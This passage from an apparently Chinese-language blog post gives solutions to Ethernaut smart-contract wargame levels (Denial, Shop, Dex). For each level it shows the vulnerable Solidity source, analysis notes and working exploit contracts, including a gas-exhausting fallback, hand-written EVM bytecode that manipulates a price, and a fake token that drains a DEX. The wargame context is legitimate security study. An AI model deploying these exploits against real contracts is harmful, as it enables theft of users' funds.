<h2 id="Source-14"><a href="#Source-14" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'@openzeppelin/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">    address public partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address payable public constant owner = address(<span class="number">0xA9E</span>);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setWithdrawPartner</span>(<span class="params">address _partner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint amountToSend = address(<span class="keyword">this</span>).balance.div(<span class="number">100</span>);</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.call.value(amountToSend)(<span class="string">""</span>);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">contractBalance</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analysis-5"><a href="#Analysis-5" class="headerlink" title="Analysis"></a>Analysis</h2><blockquote>
<p>Error handling: Assert, Require, Revert and Exceptions</p>
<p>Solidity uses state-reverting exceptions to handle errors. Such an exception undoes all changes made to the state in the current call (and all its sub-calls) and flags an error to the caller.</p>
<p>When exceptions happen in a sub-call, they “bubble up” (i.e., exceptions are rethrown) automatically unless they are caught in a try/catch statement. Exceptions to this rule are send and the low-level functions <code>call</code>, <code>delegatecall</code> and <code>staticcall</code>: they return false as their first return value in case of an exception instead of “bubbling up”.</p>
</blockquote>
<p>确实，在合约call的时候revert不会终止调用合约的执行。所以这个是重入？</p>
<h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><p>注意fallback要的是payable的，第一次没加就过不了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Denial &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setWithdrawPartner</span>(<span class="params">address _partner</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Partner</span> </span>&#123;</span><br><span class="line">    Denial target = Denial(<span class="number">0xdDea82B42FB095D3eb9fc0f792C15Bb0c82B61de</span>);</span><br><span class="line"></span><br><span class="line">    fallback() payable external &#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;</span><br><span class="line">    Denial target = Denial(<span class="number">0xdDea82B42FB095D3eb9fc0f792C15Bb0c82B61de</span>);</span><br><span class="line">    Partner partner = <span class="keyword">new</span> Partner();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        target.setWithdrawPartner(address(partner));</span><br><span class="line">        selfdestruct(payable(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Level-21-Shop"><a href="#Level-21-Shop" class="headerlink" title="Level 21. Shop"></a>Level 21. Shop</h1><blockquote>
<p>Сan you get the item from the shop for less than the price asked?</p>
</blockquote>
<h2 id="Source-15"><a href="#Source-15" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Shop</span> </span>&#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.price.gas(<span class="number">3000</span>)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="literal">true</span>;</span><br><span class="line">      price = _buyer.price.gas(<span class="number">3000</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analysis-6"><a href="#Analysis-6" class="headerlink" title="Analysis"></a>Analysis</h2><p>没看懂什么意思，看了皮卡丘师傅的wp，发现目标是把price改小。3000gas应该没啥影响？</p>
<p>好吧，是有影响的…修改一次storage(sstore)需要20000gas; sload costs 800 gas.</p>
<p>看了皮卡丘师傅的wp和黄皮书后发现call只需要700gas</p>
<p>有两种revert，我遇到的一直是<code>Warning! Error encountered during contract execution [execution reverted]</code>，所以应该不是gas不够的原因。</p>
<p><img src="./outofgas.png" alt></p>
<p><img src="./exec_revert.png" alt></p>
<p>真是非常奇怪，在私链上调试是可以的啊。。。</p>
<h2 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h2><p>这一题看了一天还是不会，发现很多细节导致我一直revert。暂时认为是out-of-gas的原因，存疑。</p>
<p>在jsvm上调试了一下查询isSold的操作是不可控的，包含了一个sload操作，用了1069gas。所以说我自己的代码使用的gas不可以超过2000gas。手写试试。</p>
<p>jsvm hacker: <code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code><br>jsvm shop  : <code>0xd9145CCE52D386f254917e481eB44e9943F39138</code></p>
<p>jsvm test<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33735B38Da6a701c568545dCfcB03FcB875f56beddC41860485763a6f2ae3a600052600060006004601c600073d9145CCE52D386f254917e481eB44e9943F391385af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3</span><br></pre></td></tr></table></figure></p>
<p>rinkeby hacker: <code>0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</code><br>rinkeby shop  : <code>0xa0379c92AE6533b4C3f82606852E6ACc416DCc3A</code></p>
<p>final </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33739B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F1860485763a6f2ae3a600052600060006004601c600073a0379c92AE6533b4C3f82606852E6ACc416DCc3A5af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;</span><br><span class="line">    <span class="comment">// address target = 0xa0379c92AE6533b4C3f82606852E6ACc416DCc3A;</span></span><br><span class="line">    address target = <span class="number">0xd9145CCE52D386f254917e481eB44e9943F39138</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        (, bytes memory isSold) = <span class="number">0xa0379c92AE6533b4C3f82606852E6ACc416DCc3A</span>.call(hex<span class="string">'e852e741'</span>);</span><br><span class="line">        <span class="comment">// require(res == true, "price(): Fail.");</span></span><br><span class="line">        <span class="keyword">return</span> uint8(isSold[<span class="number">0x1f</span>]) == <span class="number">1</span> ? <span class="number">99</span> : <span class="number">101</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        (bool res, ) = target.call(abi.encodeWithSignature(<span class="string">"buy()"</span>));</span><br><span class="line">        <span class="built_in">require</span>(res == <span class="literal">true</span>, <span class="string">"attack(): Fail."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">testgas</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        (bool res, ) = target.call&#123;<span class="attr">gas</span>:<span class="number">30000</span>&#125;(hex<span class="string">'e852e741'</span>);</span><br><span class="line">        <span class="built_in">require</span>(res == <span class="literal">true</span>, <span class="string">"testgas(): Fail."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract HackersShellcode &#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        bytes memory shellcode = hex<span class="string">'33735B38Da6a701c568545dCfcB03FcB875f56beddC41860485763a6f2ae3a600052600060006004601c600073d9145CCE52D386f254917e481eB44e9943F391385af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3'</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">return</span>(add(shellcode,<span class="number">0x20</span>),mload(shellcode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract HackersShellcodeRinkeby &#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        bytes memory shellcode = hex<span class="string">'33739B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F1860485763a6f2ae3a600052600060006004601c600073a0379c92AE6533b4C3f82606852E6ACc416DCc3A5af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3'</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">return</span>(add(shellcode,<span class="number">0x20</span>),mload(shellcode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fallback() external &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实我一开始遇到的问题就是gas不足的问题，在函数调用中如果gas不足在etherscan上不会显示out-of-gas，反而是函数调用会以失败的结果返回。</p>
<h1 id="Level-22-Dex"><a href="#Level-22-Dex" class="headerlink" title="Level 22. Dex"></a>Level 22. Dex</h1><blockquote>
<p>The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.</p>
<p>You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.</p>
<p>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.</p>
</blockquote>
<h2 id="Source-16"><a href="#Source-16" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"@openzeppelin/contracts/token/ERC20/IERC20.sol"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'@openzeppelin/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Dex  &#123;</span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  <span class="keyword">constructor</span>(address _token1, address _token2) public &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 两个都是自己指定的token？from token可控 假设amount == 1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">address from, address to, uint amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 从from这个token中转出amount那么多token，换成to这个token</span></span><br><span class="line">    <span class="comment">// 首先你得有这么多的token可以转出</span></span><br><span class="line">    <span class="built_in">require</span>(IERC20(<span class="keyword">from</span>).balanceOf(msg.sender) &gt;= amount, <span class="string">"Not enough to swap"</span>);</span><br><span class="line">    <span class="comment">// 计算价格目标的token数量</span></span><br><span class="line">    uint swap_amount = get_swap_price(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    <span class="comment">// 转出来到中间dex</span></span><br><span class="line">    IERC20(<span class="keyword">from</span>).transferFrom(msg.sender, address(<span class="keyword">this</span>), amount);</span><br><span class="line">    <span class="comment">// 从中间dex转到to这个token里去</span></span><br><span class="line">    IERC20(to).approve(address(<span class="keyword">this</span>), swap_amount);</span><br><span class="line">    IERC20(to).transferFrom(address(<span class="keyword">this</span>), msg.sender, swap_amount);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 向中间dex白白转入amount那么多token</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">add_liquidity</span>(<span class="params">address token_address, uint amount</span>) <span class="title">public</span></span>&#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(<span class="keyword">this</span>), amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get_swap_price</span>(<span class="params">address from, address to, uint amount</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(</span><br><span class="line">        (</span><br><span class="line">          amount * IERC20(to).balanceOf(address(<span class="keyword">this</span>))</span><br><span class="line">        ) / IERC20(<span class="keyword">from</span>).balanceOf(address(<span class="keyword">this</span>))</span><br><span class="line">      );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address spender, uint amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address token, address account</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address owner, address spender, uint amount</span>) <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analysis-7"><a href="#Analysis-7" class="headerlink" title="Analysis"></a>Analysis</h2><p>分了两种token，一开始我有各有10个token，contract各有100个token，目标是把contract的某一个token弄为0.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">24</span>]: target</span><br><span class="line">Out[<span class="number">24</span>]: <span class="string">'0x163F36EE7C8CF1436e14461397fD003b64AE469F'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]: token1</span><br><span class="line">Out[<span class="number">25</span>]: <span class="string">'0x947e563Bf6E16fb542ab9eEb5Bb5ED051F38C34f'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">26</span>]: token2</span><br><span class="line">Out[<span class="number">26</span>]: <span class="string">'0xce98C3170FCdFbC143879c5C3c14FB168b500500'</span></span><br></pre></td></tr></table></figure>
<p>emmmm是否可以自己写一个新的token进去玩？</p>
<p>要使contract的某个token为空，就是在swap函数中转出的时候把所有的都转出。</p>
<h2 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h2><p>remix的gas估计，我愿称之为神。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract MyERC20Token &#123;</span><br><span class="line">    address hacker = <span class="number">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>;</span><br><span class="line">    address target = <span class="number">0x163F36EE7C8CF1436e14461397fD003b64AE469F</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address account</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (account == hacker || account == target) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address, address, uint256</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Dex &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">address, address, uint</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Hacker</span> </span>&#123;</span><br><span class="line">    address ME2T = address(<span class="keyword">new</span> MyERC20Token());</span><br><span class="line">    Dex target = Dex(<span class="number">0x163F36EE7C8CF1436e14461397fD003b64AE469F</span>);</span><br><span class="line">    address token1 = <span class="number">0x947e563Bf6E16fb542ab9eEb5Bb5ED051F38C34f</span>;</span><br><span class="line">    address token2 = <span class="number">0xce98C3170FCdFbC143879c5C3c14FB168b500500</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        target.swap(ME2T,token2,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// selfdestruct(payable(0));</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一次transferFrom中忘记返回true了，remix估计会fail，就真的fail了。</p>
<h1 id="通关留念"><a href="#通关留念" class="headerlink" title="通关留念"></a>通关留念</h1><p><img src="./ak.png" alt></p>

      
    </div>

    

    
    
    

    <div>    
    
      
        <ul class="post-copyright">
          <li class="post-copyright-author">
              <strong>本文作者：</strong>Ainevsia
          </li>
          <li class="post-copyright-link">
            <strong>本文链接：</strong>
            <a href="/2021/02/21/Ethernaut/" title="Ethernaut 通关笔记">https://ainevsia.github.io/2021/02/21/Ethernaut/</a>
          </li>
          <li class="post-copyright-license">
            <strong>版权声明： </strong>
            本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！
          </li>
        </ul>
      
    </div>

    

    
      
    
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/blockchain-ethernet/" rel="tag"># blockchain ethernet</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/02/01/DASCTF-01-2021/" rel="next" title="DASCTF一月赛2021 Writeup">
                <i class="fa fa-chevron-left"></i> DASCTF一月赛2021 Writeup
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/03/12/CVE-2020-3119/" rel="prev" title="CVE-2020-3119 分析与调试">
                CVE-2020-3119 分析与调试 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://avatars2.githubusercontent.com/u/31178818?s=400&u=04fe60fc9fd9e159806f4c2363ab9a4da748bf84&v=4" alt="Ainevsia">
            
              <p class="site-author-name" itemprop="name">Ainevsia</p>
              <p class="site-description motion-element" itemprop="description">Personal Blog</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">49</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">14</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">23</span>
                    <span class="site-state-item-name">标签</span>
                  </a>
                </div>
              
            </nav>
          

          
